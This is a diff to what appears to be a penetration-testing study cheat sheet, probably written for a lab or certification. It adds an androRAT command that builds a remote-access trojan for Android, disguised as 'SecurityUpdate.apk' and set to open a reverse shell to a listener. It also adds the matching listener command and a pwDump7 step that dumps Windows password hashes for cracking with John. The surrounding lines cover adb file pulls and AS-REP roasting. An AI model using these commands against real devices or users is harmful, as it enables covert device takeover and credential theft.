@@ -128,6 +128,10 @@ adb pull <android location> <pc location>
 pwd --> ls --> cd sdcard --> ls --> cat secret.txt    (If you can't find it there then go to Downloads folder using: cd downloads)
 python3 phonesploit.py                                 
 crc32 												  (Now type crc32 path to apk to Determine the complete CRC value)
+
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+
 ```
 # Wireshark
 ```
@@ -157,6 +161,7 @@ impacket-GetNUsers  <Domain Controll>/ -dc-ip <ipaddr> -usersfile users.txt -no-
 john file.hash -wordlist=rockyou.txt 
 
 HTLM
+pwDump7.exe > hashes.txt
 john --format=NT hashes.txt
 ```
 #Privilege Escalation
